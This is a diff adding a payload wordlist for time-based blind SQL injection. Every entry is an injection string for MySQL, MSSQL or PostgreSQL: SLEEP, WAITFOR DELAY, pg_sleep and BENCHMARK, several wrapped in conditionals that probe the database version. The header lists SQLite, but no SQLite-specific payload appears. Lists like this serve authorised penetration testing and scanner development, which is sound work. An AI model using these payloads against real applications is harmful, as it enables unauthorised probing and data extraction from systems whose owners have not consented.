@@ -1,0 +1,31 @@
+# SQL Injection - Time-based Blind
+# Payloads that trigger time delays to detect SQLi
+# Covers MySQL (SLEEP), MSSQL (WAITFOR), PostgreSQL (pg_sleep), SQLite
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+' AND (SELECT SLEEP(5))--
+' AND (SELECT SLEEP(5))#
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+' AND IF(1=1,SLEEP(5),0)#
+' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
+' AND (SELECT IF(1=1,SLEEP(5),0))--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'#
+' WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; SELECT pg_sleep(5)--
+' AND pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+' OR 1=(SELECT 1 FROM pg_sleep(5))--
+') AND SLEEP(5)--
+')) AND SLEEP(5)--
+' AND BENCHMARK(10000000,SHA1('test'))--
+1 AND SLEEP(5)
